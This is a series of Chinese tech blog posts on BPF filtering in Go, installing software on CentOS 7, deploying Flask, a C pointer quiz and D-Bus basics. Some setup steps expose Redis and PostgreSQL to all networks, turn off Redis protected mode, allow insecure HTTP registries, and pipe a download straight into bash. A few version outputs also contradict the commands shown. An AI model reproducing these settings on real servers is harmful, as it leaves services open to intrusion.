~]# tcpdump -dd tcp port 8080 { 0x28, 0, 0, 0x0000000c }, { 0x15, 0, 6, 0x000086dd }, { 0x30, 0, 0, 0x00000014 }, { 0x15, 0, 15, 0x00000006 }, { 0x28, 0, 0, 0x00000036 }, { 0x15, 12, 0, 0x00001f90 }, { 0x28, 0, 0, 0x00000038 }, { 0x15, 10, 11, 0x00001f90 }, { 0x15, 0, 10, 0x00000800 }, { 0x30, 0, 0, 0x00000017 }, { 0x15, 0, 8, 0x00000006 }, { 0x28, 0, 0, 0x00000014 }, { 0x45, 6, 0, 0x00001fff }, { 0xb1, 0, 0, 0x0000000e }, { 0x48, 0, 0, 0x0000000e }, { 0x15, 2, 0, 0x00001f90 }, { 0x48, 0, 0, 0x00000010 }, { 0x15, 0, 1, 0x00001f90 }, { 0x6, 0, 0, 0x00040000 }, { 0x6, 0, 0, 0x00000000 }, [root@Aliyun ~]# tcpdump -ddd tcp port 8080 20 40 0 0 12 21 0 6 34525 48 0 0 20 21 0 15 6 40 0 0 54 21 12 0 8080 40 0 0 56 21 10 11 8080 21 0 10 2048 48 0 0 23 21 0 8 6 40 0 0 20 69 6 0 8191 177 0 0 14 72 0 0 14 21 2 0 8080 72 0 0 16 21 0 1 8080 6 0 0 262144 6 0 0 0 将上面的 -ddd输出的 BPF 程序转换为 Go 代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 var assembled = []bpf.RawInstruction{ {40, 0, 0, 12}, {21, 0, 6, 34525}, {48, 0, 0, 20}, {21, 0, 15, 6}, {40, 0, 0, 54}, {21, 12, 0, 8080}, {40, 0, 0, 56}, {21, 10, 11, 8080}, {21, 0, 10, 2048}, {48, 0, 0, 23}, {21, 0, 8, 6}, {40, 0, 0, 20}, {69, 6, 0, 8191}, {177, 0, 0, 14}, {72, 0, 0, 14}, {21, 2, 0, 8080}, {72, 0, 0, 16}, {21, 0, 1, 8080}, {6, 0, 0, 262144}, {6, 0, 0, 0}, } 设置 BPF 过滤 要为 Go 标准库的 net.PacketConn 设置BPF过滤，有两种种方法，\n调用syscall.SetsockoptInt进行设置； golang.org/x/net/ipv4提供了SetBPF方法，可以直接将标准库的 net.PacketConn转换成ipv4.PacketConn，再进行设置。 调用 syscall.SetsockoptInt进行设置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package main import ( \u0026#34;net\u0026#34; \u0026#34;unsafe\u0026#34; \u0026#34;golang.org/x/net/bpf\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) func main() { filter, err := bpf.Assemble([]bpf.Instruction{ // 加载端口值到寄存器 bpf.LoadAbsolute{Off: 22, Size: 2}, // 如果值为 8080，则执行下一行。否则跳过下一行 bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: 8080, SkipTrue: 1}, // 返回这个包的最多 0xffff 字节的数据 bpf.RetConstant{Val: 0xffff}, // 返回这个包的最多 0 字节的数据，即忽略这个包 bpf.RetConstant{Val: 0}, }) if err != nil { panic(err) } conn, err := net.ListenPacket(\u0026#34;ip:17\u0026#34;, \u0026#34;\u0026#34;) if err != nil { panic(err) } raw, err := conn.(*net.IPConn).SyscallConn() if err != nil { panic(err) } prog := \u0026amp;unix.SockFprog{ Len: uint16(len(filter)), Filter: (*unix.SockFilter)(unsafe.Pointer(\u0026amp;filter[0])), } var setErr error err = raw.Control(func(fd uintptr) { setErr = unix.SetsockoptSockFprog(int(fd), unix.SOL_SOCKET, unix.SO_ATTACH_FILTER, prog) }) if err != nil { panic(err) } if setErr != nil { panic(err) } } 通过 SetPBF设置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package main import ( \u0026#34;net\u0026#34; \u0026#34;golang.org/x/net/bpf\u0026#34; \u0026#34;golang.org/x/net/ipv4\u0026#34; ) func main() { filter, err := bpf.Assemble([]bpf.Instruction{ // 加载端口值到寄存器 bpf.LoadAbsolute{Off: 22, Size: 2}, // 如果值为 8080，则执行下一行。否则跳过下一行 bpf.JumpIf{Cond: bpf.JumpNotEqual, Val: 8080, SkipTrue: 1}, // 返回这个包的最多 0xffff 字节的数据 bpf.RetConstant{Val: 0xffff}, // 返回这个包的最多 0 字节的数据，即忽略这个包 bpf.RetConstant{Val: 0}, }) if err != nil { panic(err) } conn, err := net.ListenPacket(\u0026#34;ip:17\u0026#34;, \u0026#34;\u0026#34;) if err != nil { panic(err) } pc := ipv4.NewPacketConn(conn) err = pc.SetBPF(filter) if err != nil { panic(err) } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/bpf-%E4%BD%BF%E7%94%A8/","title":"BPF 使用"},{"content":"Centos 常用软件安装 一、Development tools 1 2 3 yum grouplist | more # 查看有那些组安装包可用 yum grouplist | grep Development\t# 搜索和 Development 相关的 yum groupinstall -y \u0026#34;Development Tools\u0026#34; # 安装 Development Tools 工具包 二、yum-utils 1 yum -y install yum-utils 三、Docker 安装 使用官方脚本安装 1 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 换源 编辑 /etc/docker/daemon.json文件，写入国内源：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 { \u0026#34;registry-mirrors\u0026#34; : [ \u0026#34;http://ovfftd6p.mirror.aliyuncs.com\u0026#34;, \u0026#34;http://registry.docker-cn.com\u0026#34;, \u0026#34;http://docker.mirrors.ustc.edu.cn\u0026#34;, \u0026#34;http://hub-mirror.c.163.com\u0026#34; ], \u0026#34;insecure-registries\u0026#34; : [ \u0026#34;registry.docker-cn.com\u0026#34;, \u0026#34;docker.mirrors.ustc.edu.cn\u0026#34; ], \u0026#34;debug\u0026#34; : true, \u0026#34;experimental\u0026#34; : true } 重启 docker：\n1 service docker restart 查看换源是否成功：\n1 2 3 4 5 6 7 8 9 10 docker info output: ... Registry Mirrors: http://ovfftd6p.mirror.aliyuncs.com/ http://registry.docker-cn.com/ http://docker.mirrors.ustc.edu.cn/ http://hub-mirror.c.163.com/ ... 配置 HTTP/HTTPS 网络代理 使用Docker的过程中，因为网络原因，通常需要使用 HTTP/HTTPS 代理来加速镜像拉取、构建和使用。下面是常见的三种场景。\n为 dockerd 设置网络代理 \u0026ldquo;docker pull\u0026rdquo; 命令是由 dockerd 守护进程执行。而 dockerd 守护进程是由 systemd 管理。因此，如果需要在执行 \u0026ldquo;docker pull\u0026rdquo; 命令时使用 HTTP/HTTPS 代理，需要通过 systemd 配置。\n为 dockerd 创建配置文件夹：\n1 sudo mkdir -p /etc/systemd/system/docker.service.d 为 dockerd 创建 HTTP/HTTPS 网络代理的配置文件，文件路径是 /etc/systemd/system/docker.service.d/http-proxy.conf ，并在该文件中添加相关环境变量。\n1 2 3 4 [Service] Environment=\u0026#34;HTTP_PROXY=http://proxy.example.com:8080/\u0026#34; Environment=\u0026#34;HTTPS_PROXY=http://proxy.example.com:8080/\u0026#34; Environment=\u0026#34;NO_PROXY=localhost,127.0.0.1,.example.com\u0026#34; 刷新配置并重启 docker 服务：\n1 2 sudo systemctl daemon-reload sudo systemctl restart docker 为 docker 容器设置网络代理 在容器运行阶段，如果需要使用 HTTP/HTTPS 代理，可以通过更改 docker 客户端配置，或者指定环境变量的方式。\n更改 docker 客户端配置：创建或更改 ~/.docker/config.json，并在该文件中添加下面配置：\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;proxies\u0026#34;: { \u0026#34;default\u0026#34;: { \u0026#34;httpProxy\u0026#34;: \u0026#34;http://proxy.example.com:8080/\u0026#34;, \u0026#34;httpsProxy\u0026#34;: \u0026#34;http://proxy.example.com:8080/\u0026#34;, \u0026#34;noProxy\u0026#34;: \u0026#34;localhost,127.0.0.1,.example.com\u0026#34; } } } 指定环境变量：运行 \u0026ldquo;docker run\u0026rdquo; 命令时，指定相关环境变量。\n环境变量 docker run 示例 HTTP_PROXY \u0026ndash;env HTTP_PROXY=\u0026ldquo;http://proxy.example.com:8080/\" HTTPS_PROXY \u0026ndash;env HTTPS_PROXY=\u0026ldquo;http://proxy.example.com:8080/\" NO_PROXY \u0026ndash;env NO_PROXY=\u0026ldquo;localhost,127.0.0.1,.example.com\u0026rdquo; 为 docker build 过程设置网络代理 在容器构建阶段，如果需要使用 HTTP/HTTPS 代理，可以通过指定 \u0026ldquo;docker build\u0026rdquo; 的环境变量，或者在 Dockerfile 中指定环境变量的方式。\n使用 \u0026ldquo;\u0026ndash;build-arg\u0026rdquo; 指定 \u0026ldquo;docker build\u0026rdquo; 的相关环境变量:\ndocker build \\ --build-arg \u0026#34;HTTP_PROXY=http://proxy.example.com:8080/\u0026#34; \\ --build-arg \u0026#34;HTTPS_PROXY=http://proxy.example.com:8080/\u0026#34; \\ --build-arg \u0026#34;NO_PROXY=localhost,127.0.0.1,.example.com\u0026#34; . 在 Dockerfile 中指定相关环境变量:\n环境变量 Dockerfile 示例 HTTP_PROXY ENV HTTP_PROXY=\u0026ldquo;http://proxy.example.com:8080/\" HTTPS_PROXY ENV HTTPS_PROXY=\u0026ldquo;http://proxy.example.com:8080/\" NO_PROXY ENV NO_PROXY=\u0026ldquo;localhost,127.0.0.1,.example.com\u0026rdquo; 设置开机自启动 1 systemctl enable docker.service 测试运行 hello-world:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 docker run hello-world Output: Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \u0026#34;hello-world\u0026#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ 四、PostgreSQL 13 安装 1 2 3 4 5 6 7 8 9 10 11 12 # 1. 配置yum源 yum install -y https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm # 2. 安装 PostgreSQL yum install -y postgresql13-server # 3. 初始化数据库 /usr/pgsql-13/bin/postgresql-13-setup initdb # 4. 自启动 systemctl enable postgresql-13 systemctl start postgresql-13 初始化 1 2 3 4 5 6 7 8 # 1. 切换到 postgres 用户 su - postgres # 2. 启动SQL Shell psql # 3. 修改密码 ALTER USER postgres WITH PASSWORD \u0026#39;NewPassword\u0026#39;; 配置远程访问 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 1. 开放防火墙端口 firewall-cmd --add-port=5432/tcp --permanent firewall-cmd --reload # 2. 修改IP绑定 #修改配置文件 vi /var/lib/pgsql/13/data/postgresql.conf #将监听地址修改为 * listen_addresses=\u0026#39;*\u0026#39; # 3. 允许所有IP访问 #修改配置文件 vi /var/lib/pgsql/13/data/pg_hba.conf # 在文件底部写入： host all all 0.0.0.0/0 md5 # 4. 重启PostgreSQL服务 systemctl restart postgresql-13 使用 Navicat 测试连接，连接成功！\n五、Redis 安装 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 1. 下载 fedora 的 epel 仓库 yum install epel-release # 2. 安装 Redis yum install redis # 3. 开机自启动 chkconfig redis on # 4. 其他命令 # 启动redis service redis start # 停止redis service redis stop # 查看redis运行状态 service redis status # 查看redis进程 ps -ef | grep redis 配置远程访问 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # 1. 开放6379端口 firewall-cmd --zone=public --add-port=6379/tcp --permanent firewall-cmd --reload # 2. 修改配置文件 vi /etc/redis.conf # 查找 port 修改端口 port 6379 # 查找 requirepass 修改密码 requirepass NewPassword # 配置远程访问 # 找到 bind 127.0.0.1 将其注释 # 找到 protected-mode yes 将其改为 protected-mode no # 3. 停止并重启redis服务 # 停止 service redis stop # 以配置文件重启 redis-server /etc/redis.conf \u0026amp; 使用 1 2 # 命令行交互 redis-cli 也可以使用：Another Redis Desktop Manager 在 Windows 管理 Redis 连接\n六、Python Python 2 Centos 自带了 Python 2.7，可直接进行使用\n1 2 python2 -V # Python 2.7.5 Python 3 yum 安装 1 2 3 4 5 6 # 安装 python 和 python3-devel yum install -y python3 python3-devel # 使用 python3 -V # Python 3.6.8 pip3 升级与换源\n1 2 3 4 5 6 # 换阿里源 pip3 config set global.index-url http://mirrors.aliyun.com/pypi/simple/ pip3 config set install.trusted-host mirrors.aliyun.com # pip 升级 pip3 install --upgrade pip 手动安装最新版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 1. 下载安装包 wget https://www.python.org/ftp/python/3.9.7/Python-3.9.7.tgz # 2. 解压 tar -zxvf Python-3.9.7.tgz # 3. 下载编译依赖 yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make # 4. 编译安装 cd Python-3.9.7 ./configure --prefix=/usr/local/python39 # --prefix是Python的安装目录，同时安装了setuptools和pip工具 make \u0026amp;\u0026amp; make install # 5. 建立软连接 ln -s /usr/local/python39 /usr/local/bin/python3 # 6. 建立环境变量 # 编辑环境变量配置文件 $HOME/.bashrc，在文件末尾追加： export PATH=/usr/local/python27/bin:/usr/local/python39/bin:$PATH # 使更改生效 source $HOME/.bashrc # 7. 查看版本 python3 -V # Python 3.9.7 Hello World！\n新建 hello.py文件，写入以下代码：\n1 print(\u0026#34;Hello World!\u0026#34;) 运行该文件：\n1 2 python3 hello.py # Hello World! 七、Go yum 安装 1 2 3 4 5 6 # 安装 yum install golang # 使用 go version # go version go1.15.14 linux/amd64 二进制发行版安装 安装 1 2 3 4 5 6 7 8 9 10 11 12 # 1. 去官网下载最新版二进制包 wget https://studygolang.com/dl/golang/go1.20.linux-amd64.tar.gz # 2. 提取压缩包内容 sudo tar -xzf go1.20.linux-amd64.tar.gz -C /usr/local # 3. 简历软链接 sudo ln -s /usr/local/go/bin/* /usr/bin/ # 4. 验证是否成功 go version # go version go1.18 linux/amd64 配置环境变量 1 2 3 4 5 # 编辑环境变量配置文件 $HOME/.bashrc，在文件末尾追加： export GOROOT=/usr/local/go #设置为go安装的路径，有些安装包会自动设置默认的goroot export GOPATH=$HOME/go-work #默认的Golang项目的工作空间 export GOBIN=$GOPATH/bin # go install命令生成的可执行文件的路径 export PATH=$PATH:$GOROOT/bin:$GOBIN 1 2 3 4 # 保存，使配置文件生效 source $HOME/.bashrc # 查看环境变量 go env Go Modules 配置\n1 2 3 4 # 换源 go env -w GO111MODULE=on go env -w GOPROXY=https://goproxy.cn,direct go env -w GOSUMDB=sum.golang.google.cn Hello World！\n新建 hello.go文件，写入以下代码：\n1 2 3 4 5 6 7 package main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello World!\u0026#34;) } 运行该文件：\n1 2 go run hello.go # Hello World! 八、NodeJS yum 安装 1 2 3 4 5 6 7 8 # 安装 yum install nodejs # 使用 node -v # v6.17.1 npm -v # 3.10.10 二进制发行版安装 安装 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 1. 官网下载二进制发行版的压缩包 wget https://nodejs.org/dist/v20.15.1/node-v20.15.1-linux-x64.tar.xz # 2. 解压 tar -xf node-v20.15.1-linux-x64.tar.xz -C /usr/local/ # 3. 创建软连接 ln -s /usr/local/node-v20.15.1-linux-x64/bin/* /usr/bin/ # 4. 添加环境变量 # 编辑环境变量配置文件 $HOME/.bashrc，在文件末尾追加： export NODE_HOME=/usr/local/node-v20.15.1-linux-x64 export PATH=$NODE_HOME/bin:$PATH # 使更改生效 source $HOME/.bashrc Hello World！ 新建 hello.go文件，写入以下代码：\n1 2 3 4 5 function hello() { console.log(\u0026#39;Hello World!\u0026#39;); } hello(); 运行该文件：\n1 2 node hello.js # Hello World! 九、Docker-compose 安装 最新发行的版本地址：https://github.com/docker/compose/releases\n下载适合自己的版本：\n1 sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/v2.16.0/docker-compose-linux-x86_64\u0026#34; -o /usr/local/bin/docker-compose 赋予二进制文件可执行权限：\n1 sudo chmod +x /usr/local/bin/docker-compose 测试安装：\n1 2 3 docker-compose --version docker-compose version 1.29.2, build 5becea4c ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/centos7-%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/","title":"Centos7 常用软件安装"},{"content":"Centos7下部署Flask应用 一、安装 Python3 1 2 3 4 5 6 7 8 yum install python3 -y # 验证Python安装是否完成 python3 -V pip3 -V # 更新pip pip3 install --upgrade pip 二、安装uWSGI 安装依赖：\n1 yum install python3-devel 如果出现下面的错误：\nTransaction check error: file /etc/rpm/macros.python from install of python-rpm-macros-3-34.el7.noarch conflicts with file from package python-devel-2.7.5-80.el7_6.x86_64 Error Summary 则执行下面的命令后再次进行安装：\nyum update python-devel 安装uWSGI：\n1 2 3 4 pip3 install uwsgi # 验证安装uwsgi是否完成 uwsgi --version 三、安装nginx 1 yum install nginx -y 启动 nginx：\n1 systemctl start nginx 通过 IP 直接访问服务器，访问成功说明 nginx 开启成功：\n常用命令：\n1 2 3 4 5 6 7 8 9 10 11 12 # 设置nginx开机自启动 systemctl enable nginx # 开启nginx systemctl start nginx # 查看nginx运行状态 systemctl status nginx # 关闭nginx systemctl stop nginx # 重启nginx systemctl restart nginx # 重载配置文件 systemctl reload nginx 四、创建flask应用 首先安装flask库：\npip3 install flask 创建 flask 应用：\n1 2 3 4 5 6 7 8 9 10 11 # /var/www/app.py from flask import Flask app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def hello_world(): return \u0026#39;Hello World!\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run() 使用 Python 启动 flask 应用：\n1 python3 app.py 运行成功：\n1 2 3 4 5 6 * Serving Flask app \u0026#39;app\u0026#39; (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit) 五、使用uwsgi启动flask 编写配置文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # /var/www/conf/config.ini [uwsgi] # uwsgi 启动时所使用的地址与端口 socket = 127.0.0.1:8000 # python 调用的模块 module = app # python 启动程序文件 wsgi-file = /var/www/app.py # python 程序内用以启动的 application 变量名 callable = app # 处理器数 processes = 4 # 线程数 threads = 8 # 输出日志文件 daemonize = /var/www/log/server.log 使用 uwsgi启动flask：\n1 2 3 4 uwsgi /var/www/conf/config.ini out: [uWSGI] getting INI configuration from conf/config.ini 启动成功！\n六、使用nginx启动uwsgi 编辑 nginx.conf ：\n1 2 3 4 5 # 备份配置文件 cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak # 编辑配置文件 vim /etc/nginx/nginx.conf server { listen 80; location / { include uwsgi_params; uwsgi_pass 127.0.0.1:8000; uwsgi_param UWSGI_CHDIR /var/www; } } 重启 nginx ：\n1 2 3 4 # 重载配置文件 systemctl reload nginx # 重启nginx systemctl restart nginx 直接访问服务器 IP：\n配置完成！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/centos7-%E4%B8%8B%E9%83%A8%E7%BD%B2flask%E5%BA%94%E7%94%A8/","title":"Centos7 下部署Flask应用"},{"content":"Centos 7 下使用 Apache 配置 Flask 一、工具介绍 1. Apache Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。\n2. Flask Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。较其他同类型框架更为灵活、轻便、安全且容易上手,小型团队在短时间内就可以完成功能丰富的中小型网站或Web服务的实现。\n3. 为什么使用 apache 是配置 flask？ Flask本身支持使用 app.run(threaded=True, host='0.0.0.0',)实现多线程运行，但依然无法实现较高的性能表现。这种时候我们就可以将Flask应用部署到专业的后端服务器。可以使用MOD_WSGI 拓展将应用部署至Apache HTTP Server下。\n二、所使用的工具版本 Linux 系统：Centos7.6 Python 版本：Python3.7.5 与 2.7.5 Apache 版本：2.4.6 Flask 版本：1.1.1 二、配置 1. 安装 Apache 1 yum install -y httpd httpd-devel Apache 常用命令：\n1 2 3 4 systemctl start httpd.service # 启动 systemctl stop httpd.service # 关闭 systemctl restart httpd.service # 重启 systemctl enable httpd.service # 开机自启 如果防火墙没有开启80端口，则可使用下面的命令开启：\n1 2 firewall-cmd --zone=public --add-port=80/tcp --permanent firewall-cmd --reload 此时外网已经可以通过ip访问Apache的默认页面。\n2. 安装 Python 及依赖 yum install -y python37-devel.x86_64 # 安装环境依赖 yum install -y python36 # 安装 Python37 yum install -y python36-setuptools # 安装 pip easy_install-3.6 pip pip3 install virtualenv # 安装virtualenv 3. 创建 flask 项目 1 2 3 4 5 6 7 8 mkdir /var/www/flaskTest cd /var/www/flaskTest virtualenv py3env # 创建虚拟环境 source py3env/bin/activate # 进入虚拟环境 (py3env) pip3 install flask # 安装 flask (py3env) pip install mod_wsgi # 安装 mod_wsgi vim app.py # 创建 flask 项目 在 app.py 中编写一个简单的 flask 项目：\n1 2 3 4 5 6 7 8 9 10 from flask import Flask, request app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def hello_world(): return \u0026#39;Hello World\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run() 4. 配置mod_wsgi 创建一个 wsgi 文件：\n1 vim app.wsgi 将下面的程序写入：\n1 2 3 4 5 6 7 activate_this = \u0026#39;/var/www/flaskTest/py3env/bin/activate_this.py\u0026#39; with open(activate_this) as file_: exec(file_.read(), dict(__file__=activate_this)) import sys sys.path.insert(0, \u0026#39;/var/www/flaskTest\u0026#39;) from app import app as application 1 2 3 4 mod_wsgi-express install-module # 执行该命令得到输出 # 输出 # LoadModule wsgi_module \u0026#34;/usr/lib64/httpd/modules/mod_wsgi-py27.so\u0026#34; # WSGIPythonHome \u0026#34;/usr\u0026#34; 5. 配置 Apache 1 vi /etc/httpd/conf/httpd.conf 将信息追加到配置文件末尾：\n1 2 3 4 5 6 7 8 9 LoadModule wsgi_module \u0026#34;/usr/lib64/httpd/modules/mod_wsgi-py27.so\u0026#34; \u0026lt;VirtualHost *:80\u0026gt; ServerName example.com WSGIScriptAlias / /var/www/flaskTest/app.wsgi \u0026lt;Directory /var/www/flaskTest\u0026gt; Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; 6. 重启 Apache 服务 1 systemctl restart httpd.service 到此为止配置过程就已结束，从外网访问本机 IP 就可以看到 \u0026ldquo;Hello World!\u0026rdquo; 界面了。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/centos7-%E4%B8%8B%E4%BD%BF%E7%94%A8-apache-%E9%85%8D%E7%BD%AE-flask/","title":"Centos7 下使用 Apache 配置 Flask"},{"content":"C 语言指针测试 考题： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main() { int str[] = {270, 30, 40}; char *ptr = (char*)\u0026amp;str[0]; for(int i=0; i\u0026lt;4;i++) { printf(\u0026#34;%2d, %p\\n\u0026#34;, *ptr, ptr); ptr++; } return 0; } 问题 在Linux或Windows平台上运行上面的程序，输出结果是怎样的？\n答案 14, 000000000061FE08 1, 000000000061FE09 0, 000000000061FE0A 0, 000000000061FE0B 分析 程序中首先定义了一个int类型的数组，然后从数组中拿出第一个数，将它强制转换为char类型的指针：\n1 2 3 4 5 int str[] = {270, 30, 40}; char *ptr = (char*)\u0026amp;str[0]; //转化一下 int str = 270; char *ptr = (char*)\u0026amp;str; 下一步，进入循环打印数字。\n观察for语句发现这是一个四次循环，打印输出的是ptr 地址中的值以及ptr 地址，输出之后ptr地址加一：\n1 2 3 4 5 for(int i=0; i\u0026lt;4;i++) { printf(\u0026#34;%2d, %p\\n\u0026#34;, *ptr, ptr); ptr++; } 想要解出这个题的答案，我们需要了解C语言中，不同类型的数据占用内存地址的大小：\n类型 32位平台(bytes) 64位平台(bytes) char 1 1 short int 2 2 int 4 4 long int 4 8 long long int 8 8 long 4 8 long long 8 8 float 4 4 double 8 8 size_t 4 8 ssize_t 4 8 还有一个问题，我们需要了解大小端的概念：\n大端模式：数据的高字节在低地址，低字节在高地址 小端模式：数据的高字节在高地址，低字节在低地址\n一般常见的操作系统（Linux、Windows都是小端，Mac是大端）都是小端，而通讯协议则是大端\n那么int类型的270在 Linux和Windows 的内存中怎样表示的呢？\n表示：0000 1110, 0000 0001, 0000 0000, 0000 0000 字节： 1 2 3 4 从表格中我们可以发现，char 类型是占用1个字节的，而 int 类型是占用4个字节的。\n那么 int 类型转化为 char 类型时，一个 int 类型就会转化为4个 char 类型的数据。\n表示：0000 1110, 0000 0001, 0000 0000, 0000 0000 字节： 1 2 3 4 对应数： 14 1 0 0 这就是输出结果的由来，大家学废了吗？\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/c%E8%AF%AD%E8%A8%80%E6%8C%87%E9%92%88%E6%B5%8B%E8%AF%95/","title":"C语言指针测试"},{"content":"D-Bus 学习 一、背景知识 D-Bus是一种高级的进程间通信机制（interprocess communication，IPC），它由freedesktop.org项目提供，使用GPL许可证发行。\nD-Bus最主要的用途是在 Linux 桌面环境为进程提供通信，同时能将 Linux 桌面环境和 Linux 内核事件作为消息传递到进程。D-Bus(其中D原先是代表桌面“Desktop” 的意思)，即：用于桌面操作系统的通信总线。现在逐渐被引入到嵌入式系统中，不过名字还是保留原先的叫法而已。\nD-Bus的主要概念为总线，注册后的进程可通过总线接收或传递消息，进程也可注册后等待内核事件响应，例如等待网络状态的转变或者计算机发出关机指令。\n二、主要特性 1. 结构层次 DBUS 由如下三个层次构成：\nlibdbus: 接口库，提供点对点通信和数据交换的能力；\n守护进程: 即dbus daemon进程，提供多对多的通信机制，进程与daemon建立dbus连接，由daemon进行消息的分发；\n封装库: DBUS 由如下三个层次构成，如dbus-glib/GDBus, QtDBus。\nDBus是低时延且低消耗的，为了最小化传送的往返时间，它被设计得小而高效。它的协议是二进制的，而不是文本的，这样就排除了费时的序列化过程。\n2. 系统总线和会话总线 在一台机器上总线守护有多个实例(instance)。这些总线之间都是相互独立的。\n一个持久的系统总线（system bus）\n它在引导时就会启动。这个总线由操作系统和后台进程使用，安全性非常好，以使得任意的应用程序不能欺骗系统事件。 它是桌面会话和操作系统的通信，这里操作系统一般而言包括内核和系统守护进程。 这种通道的最常用的方面就是发送系统消息，比如：插入一个新的存储设备；有新的网络连接；等等。\n还将有很多会话总线（session buses）\n这些总线当用户登录后启动，属于那个用户私有。它是用户的应用程序用来通信的一个会话总线。 同一个桌面会话中两个桌面应用程序的通信，可使得桌面会话作为整体集成在一起以解决进程生命周期的相关问题。 这在GNOME和KDE桌面中大量使用。\n3. 主要功能 D-Bus的主要目的是提供如下的一些更高层的功能：\n结构化的名字空间； 独立于架构的数据格式； 支持消息中的大部分通用数据元素； 带有异常处理的通用远程调用接口； 支持广播类型的通信。 三、DBus 编程基础知识 1. 地址 连接建立需要有 server 和 client：点对点通信时就是一个 server 和 一个 client；在 bus daemon 通信时，应用就是client，bus daemon 是server。\n一个D-Bus的地址就是是指 server 用于监听，client 用于连接的地方，例如 unix:path=/tmp/abcedf标识server 将在路径 /tmp/abcedf 的 UNIX domain socket 监听。 地址可以是指定的TCP/IP socket 或者其他在或者将在D-Bus协议中定义的传输方式。\n如果使用 bus daemon 通信，libdbus将通过读取环境变量自动获取 session bus damon 的地址，通过检查一个指定的 UNIX domain socket 路径获取 system bus 的地址；如果使用点对点通信，需要定义哪个应用是server，哪个应用是client，并定义一套机制是他们认可server的地址（通常不使用）。\n2. Bus Names总线名字 当一个应用连接到 bus daemon，daemon 立即会分配一个名字给这个连接，称为 Unique Connection Name， 这个唯一标识的名字以冒号 \u0026quot;:\u0026quot; 开头，例如 :1.2，这个名字在 daemon 的整个生命周期是唯一的。\n但是这种名字总是临时分配，无法确定的，也难以记忆，因此应用可以要求有另外一个公共名 well-known name 来对应这个唯一标识，就像我们使用域名来映射 IP地址一样。例如可以使用 org.fmddlmyy.Test 来映射 :1.2。这样我们就可以使用公共名连接到 DBus 服务。\n当一个应用结束或者崩溃是，系统内核会关闭它的总线连接。总线会发送 Notification 消息告诉其他应用，当检测到这类 Notification 时，应用可以知道其他应用的生命周期。\n3. 原生对象和对象路径 d-bus 的底层接口是没有这些对象的概念的，它提供的是一种叫对象路径（object path），用于让高层接口绑定到各个对象中去，允许远端应用程序指向它们。object path就像是一个文件路径，可以叫做 /org/kde/kspread/sheets/3/cells/4/5 等。\n4. Proxies代理 代理对象用于模拟在另外的进程中的远端对象，代理对象像是一个正常的普通对象。\nd-bus 的底层接口必须手动创建方法调用的消息，然后发送，同时必须手动接受和处理返回的消息。而高层接口可以使用代理来处理这些操作：当调用代理对象的方法时，代理内部会转换成 d-bus 的方法调用，并且自动等待消息返回，对返回结果解包， 返回给相应的方法。\n3. 接口 Interface 接口是一组方法和信号，每一个对象支持一个或者多个接口，接口定义一个对象实体的类型。 D-Bus使用简单的命名空间字符串来表示接口，例如 org.freedesktop.Introspectable。\n4. Methods 和 Signals 每一个对象有两类成员：方法和信号：\n方法就是一个函数，具有有输入和输出； 